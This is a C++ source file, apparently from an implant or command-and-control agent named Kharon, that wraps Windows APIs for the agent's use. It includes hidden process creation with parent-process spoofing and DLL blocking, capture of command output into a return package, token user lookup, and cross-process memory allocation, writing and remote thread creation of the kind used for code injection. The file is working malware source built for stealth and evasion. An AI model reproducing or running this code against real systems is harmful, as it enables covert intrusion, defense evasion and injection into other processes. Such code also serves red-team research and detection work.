#include <Kharon.h>

using namespace Root;

auto DECLFN Library::Load(
    _In_ PCHAR LibName
) -> UPTR {
    return (UPTR)Self->Krnl32.LoadLibraryA( LibName );
}

auto DECLFN Heap::Alloc(
    _In_ ULONG Size
) -> PVOID {
    return Self->Ntdll.RtlAllocateHeap( C_PTR( Self->Session.HeapHandle ), HEAP_ZERO_MEMORY, Size );
}

auto DECLFN Heap::ReAlloc(
    _In_ PVOID Block,
    _In_ ULONG Size
) -> PVOID {
    return Self->Ntdll.RtlReAllocateHeap( C_PTR( Self->Session.HeapHandle ), HEAP_ZERO_MEMORY, Block, Size );
}

auto DECLFN Heap::Free(
	_In_ PVOID Block,
	_In_ ULONG Size
) -> BOOL {
    Mem::Zero( U_PTR( Block ), Size );
    return Self->Ntdll.RtlFreeHeap( C_PTR( Self->Session.HeapHandle ), 0, Block );
}

auto DECLFN Token::GetUser( 
    _Out_ PCHAR *UserNamePtr, 
    _Out_ ULONG *UserNameLen, 
    _In_  HANDLE TokenHandle 
) -> BOOL {
    PTOKEN_USER  TokenUserPtr = NULL;
    SID_NAME_USE SidName      = SidTypeUnknown;
    NTSTATUS     NtStatus     = STATUS_SUCCESS;
    ULONG        TotalLen     = 0;
    ULONG        ReturnLen    = 0;
    PSTR         DomainStr    = NULL;
    ULONG        DomainLen    = 0;
    PSTR         UserStr      = NULL;
    ULONG        UserLen      = 0;
    BOOL         bSuccess     = FALSE;

    NtStatus = Self->Ntdll.NtQueryInformationToken( TokenHandle, TokenUser, NULL, 0, &ReturnLen );
    if ( NtStatus != STATUS_BUFFER_TOO_SMALL ) {
        goto _KH_END;
    }

    TokenUserPtr = ( PTOKEN_USER )Self->Hp->Alloc( ReturnLen );
    if ( !TokenUserPtr ) {
        goto _KH_END;
    }

    NtStatus = Self->Ntdll.NtQueryInformationToken( TokenHandle, TokenUser, TokenUserPtr, ReturnLen, &ReturnLen );
    if ( !NT_SUCCESS( NtStatus ) ) { goto _KH_END; }

    bSuccess = Self->Advapi32.LookupAccountSidA( 
        NULL, TokenUserPtr->User.Sid, NULL,
        &UserLen, NULL, &DomainLen, &SidName 
    );

    if ( !bSuccess && KhGetError == ERROR_INSUFFICIENT_BUFFER ) {
        TotalLen = UserLen + DomainLen + 2; 

        *UserNamePtr = ( PCHAR )Self->Hp->Alloc( TotalLen ); 
        if ( !*UserNamePtr ) { goto _KH_END; }

        DomainStr = *UserNamePtr;
        UserStr   = (*UserNamePtr) + DomainLen;

        bSuccess = Self->Advapi32.LookupAccountSidA( 
            NULL, TokenUserPtr->User.Sid, UserStr,
            &UserLen, DomainStr, &DomainLen, &SidName 
        );

        if ( bSuccess ) {
            (*UserNamePtr)[DomainLen] = '\\';
        } else {
            Self->Hp->Free( *UserNamePtr, TotalLen );
            *UserNamePtr = NULL;
            *UserNameLen = 0;
        }
    }

_KH_END:
    if ( TokenUserPtr ) {
        Self->Hp->Free( TokenUserPtr, ReturnLen );
    }
    return bSuccess;
}

auto DECLFN Token::ProcOpen(
    _In_ HANDLE  ProcessHandle,
    _In_ ULONG   RightsAccess,
    _In_ PHANDLE TokenHandle
) -> BOOL {
    return Self->Advapi32.OpenProcessToken( ProcessHandle, RightsAccess, TokenHandle );
}

auto DECLFN Process::Open(
    _In_ ULONG RightsAccess,
    _In_ BOOL  InheritHandle,
    _In_ ULONG ProcessID
) -> HANDLE {
    return Self->Krnl32.OpenProcess( RightsAccess, InheritHandle, ProcessID );
}

auto DECLFN Process::Create(
    _In_  PCHAR                CommandLine,
    _In_  ULONG                PsFlags,
    _Out_ PPROCESS_INFORMATION PsInfo
) -> BOOL {
    ProcThreadAttrList ProcAttr;

    BOOL   Success      = FALSE;
    ULONG  TmpValue     = 0;
    HANDLE PipeWrite    = NULL;
    HANDLE PipeRead     = NULL; 
    PBYTE  PipeBuff     = NULL;
    ULONG  PipeBuffSize = 0;
    UINT8  UpdateCount  = 0;

    STARTUPINFOEXA      SiEx         = { 0 };
    SECURITY_ATTRIBUTES SecurityAttr = { sizeof( SECURITY_ATTRIBUTES ), NULL, TRUE };

    if ( Self->Ps->Ctx.BlockDlls ) { UpdateCount++; }
    if ( Self->Ps->Ctx.ParentID  ) { UpdateCount++; };

    SiEx.StartupInfo.cb          = sizeof( STARTUPINFOEXA );
    SiEx.StartupInfo.dwFlags     = EXTENDED_STARTUPINFO_PRESENT;
    SiEx.StartupInfo.wShowWindow = SW_HIDE;

    PsFlags |= CREATE_NO_WINDOW;

    if ( Self->Ps->Ctx.Pipe ) {
        Success = Self->Krnl32.CreatePipe( &PipeRead, &PipeWrite, &SecurityAttr, PIPE_BUFFER_LENGTH );
        if ( !Success ) { goto _KH_END; }

        Self->Krnl32.SetHandleInformation( PipeWrite, HANDLE_FLAG_INHERIT, HANDLE_FLAG_INHERIT );

        SiEx.StartupInfo.hStdError  = PipeWrite;
        SiEx.StartupInfo.hStdOutput = PipeWrite;
        SiEx.StartupInfo.hStdInput  = Self->Krnl32.GetStdHandle( STD_INPUT_HANDLE );
        SiEx.StartupInfo.dwFlags   |= STARTF_USESTDHANDLES;
    }

    if ( UpdateCount           ) ProcAttr.Initialize( UpdateCount );
    if ( Self->Ps->Ctx.ParentID  ) ProcAttr.UpdateParentSpf( Process::Open( PROCESS_ALL_ACCESS, TRUE, Self->Ps->Ctx.ParentID ) );
    if ( Self->Ps->Ctx.BlockDlls ) ProcAttr.UpdateBlockDlls();

    if ( Self->Ps->Ctx.ParentID || Self->Ps->Ctx.BlockDlls ) SiEx.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)ProcAttr.GetAttrBuff();

    Success = Self->Krnl32.CreateProcessA( 
        NULL, CommandLine, NULL, NULL, TRUE, PsFlags, 
        NULL, Self->Ps->Ctx.CurrentDir, &SiEx.StartupInfo, PsInfo
    );
    if ( !Success ) { goto _KH_END; }

    if ( Self->Ps->Ctx.Pipe ) {
        
        Self->Ntdll.NtClose( PipeWrite ); PipeWrite = NULL;

        DWORD waitResult = Self->Krnl32.WaitForSingleObject( PsInfo->hProcess, 1000 );

        if (waitResult == WAIT_TIMEOUT) {
            KhDbg( "Timeout waiting for process output" );
        }

        Success = Self->Krnl32.PeekNamedPipe( 
            PipeRead, NULL, 0, NULL, &PipeBuffSize, NULL           
        );
        
        if ( !Success ) { goto _KH_END; }

        if ( PipeBuffSize > 0 ) {
            PipeBuff = (PBYTE)Self->Hp->Alloc( PipeBuffSize );
            if ( !PipeBuff ) { goto _KH_END; }
        
            Success = Self->Krnl32.ReadFile( 
                PipeRead, PipeBuff, PipeBuffSize, &TmpValue, NULL 
            );
            if ( !Success ) { goto _KH_END; }
        
            Self->Pkg->Bytes( GLOBAL_PKG, PipeBuff, TmpValue );
            
        } else {
            KhDbg( "No data available in pipe" );
        }
    }
 
_KH_END:
    if ( PipeBuff  ) Self->Hp->Free( PipeBuff, PipeBuffSize );
    if ( PipeWrite ) Self->Ntdll.NtClose( PipeWrite );
    if ( PipeRead  ) Self->Ntdll.NtClose( PipeRead );

    return Success;
}

auto DECLFN Thread::RndEnum( VOID ) -> ULONG {
    PSYSTEM_PROCESS_INFORMATION SysProcInfo   = { 0 };
    PSYSTEM_THREAD_INFORMATION  SysThreadInfo = { 0 };
    PVOID                       ValToFree     = NULL;
    ULONG                       bkErrorCode   =  0;
    ULONG                       ReturnLen     = 0;
    ULONG                       RandomNumber  = 0;
    ULONG                       ThreadID      = 0;
    BOOL                        bkSuccess     = FALSE;

    Self->Ntdll.NtQuerySystemInformation( SystemProcessInformation, NULL, NULL, &ReturnLen );

    SysProcInfo = (PSYSTEM_PROCESS_INFORMATION)Self->Hp->Alloc( ReturnLen );
    ValToFree   = SysProcInfo;

    bkErrorCode = Self->Ntdll.NtQuerySystemInformation( SystemProcessInformation, SysProcInfo, ReturnLen, &ReturnLen );
    if ( bkErrorCode ) goto _KH_END;

    SysProcInfo = (PSYSTEM_PROCESS_INFORMATION)( U_PTR( SysProcInfo ) + SysProcInfo->NextEntryOffset );

    while( 1 ) {
        if ( SysProcInfo->UniqueProcessId == UlongToHandle( Self->Session.ProcessID ) ) {
            SysThreadInfo = SysProcInfo->Threads;

            for ( INT i = 0; i < SysProcInfo->NumberOfThreads; i++ ) {
                if ( HandleToUlong( SysThreadInfo[i].ClientId.UniqueThread ) != Self->Session.ThreadID ) {
                    ThreadID = HandleToUlong( SysThreadInfo[i].ClientId.UniqueThread ); goto _KH_END;
                }
            }
        }

        SysProcInfo = (PSYSTEM_PROCESS_INFORMATION)( U_PTR( SysProcInfo ) + SysProcInfo->NextEntryOffset );
    }

_KH_END:
    if ( SysProcInfo ) Self->Hp->Free( ValToFree, sizeof( SYSTEM_PROCESS_INFORMATION ) );

    return ThreadID;
}

auto DECLFN Thread::Create(
    _In_  HANDLE ProcessHandle,
    _In_  PVOID  StartAddress,
    _In_  PVOID  Parameter,
    _In_  ULONG  StackSize,
    _In_  ULONG  Flags,
    _Out_ PULONG ThreadID
) -> HANDLE {
    if ( ProcessHandle ) {
        return Self->Krnl32.CreateRemoteThread( ProcessHandle, 0, StackSize, (LPTHREAD_START_ROUTINE)StartAddress, C_PTR( Parameter ), Flags, ThreadID );
    } else {
        return Self->Krnl32.CreateThread( 0, StackSize, (LPTHREAD_START_ROUTINE)StartAddress, C_PTR( Parameter ), Flags, ThreadID );
    }
}

auto DECLFN Thread::Open(
    _In_ ULONG RightAccess,
    _In_ BOOL  Inherit,
    _In_ ULONG ThreadID
) -> HANDLE {
    return Self->Krnl32.OpenThread( RightAccess, Inherit, ThreadID );
}

auto DECLFN Memory::Alloc(
    _In_ HANDLE Handle,
    _In_ PVOID Base,
    _In_ ULONG Size,
    _In_ ULONG AllocType,
    _In_ ULONG Protect
) -> PVOID {
    if ( !Handle ) {
        return Self->Krnl32.VirtualAlloc( Base, Size, AllocType, Protect );
    } else {
        return Self->Krnl32.VirtualAllocEx( Handle, Base, Size, AllocType, Protect );
    }
}

auto DECLFN Memory::Protect(
    _In_  HANDLE Handle,
    _In_  PVOID  Base,
    _In_  ULONG  Size,
    _In_  ULONG  NewProt,
    _Out_ PULONG OldProt
) -> BOOL {
    if ( !Handle ) {
        return Self->Krnl32.VirtualProtect( Base, Size, NewProt, OldProt );
    } else {
        return Self->Krnl32.VirtualProtectEx( Handle, Base, Size, NewProt, OldProt );
    }
}

auto DECLFN Memory::Write(
    _In_ HANDLE Handle,
    _In_ PVOID  Base,
    _In_ PBYTE  Buffer,
    _In_ ULONG  Size
) -> BOOL {
    ULONG_PTR Written = 0;

    return Self->Krnl32.WriteProcessMemory( Handle, Base, Buffer, Size, &Written );
}

auto DECLFN Memory::Free(
    _In_ HANDLE Handle,
    _In_ PVOID  Base,
    _In_ ULONG  Size,
    _In_ ULONG  FreeType
) -> BOOL {
    if ( !Handle ) {
        return Self->Krnl32.VirtualFree( Base, Size, FreeType );
    } else {
        return Self->Krnl32.VirtualFreeEx( Handle, Base, Size, FreeType );
    }
}
 